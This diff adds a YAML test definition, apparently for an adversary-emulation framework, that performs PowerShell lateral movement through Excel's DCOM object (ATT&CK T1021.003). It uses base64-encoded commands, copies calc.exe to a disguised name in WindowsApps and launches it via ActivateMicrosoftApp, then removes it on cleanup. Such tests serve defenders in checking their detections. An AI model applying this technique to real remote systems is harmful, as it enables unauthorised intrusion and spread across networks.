@@ -1,0 +1,29 @@
+- id: 54827238-b2b0-5b74-ace5-4c20db58a0cb
+  name: Soumaia ART Tests - PowerShell Lateral Movement Using Excel Application Object
+  description: 'Powershell lateral movement using the Excel COM objects.
+
+
+    Reference:
+
+
+    https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922
+
+
+    Upon successful execution, cmd will spawn calc.exe on a remote computer.'
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.003
+    name: 'Remote Services: Distributed Component Object Model'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBFAHgAYwBlAGwALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIgAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAiAEUAeABjAGUAbAAiAAoAIAAgAGUAeABpAHQAIAAwAAoAfQAgAGMAYQB0AGMAaAAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAEUAeABjAGUAbAAgAG0AYQBuAHUAYQBsAGwAeQAgAHQAbwAgAG0AZQBlAHQAIAB0AGgAaQBzACAAcgBlAHEAdQBpAHIAZQBtAGUAbgB0ACIACgA=
+          }
+          copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+          $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","localhost"))
+          $com.ActivateMicrosoftApp("5")
+        cleanup: |-
+          Remove-Item 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
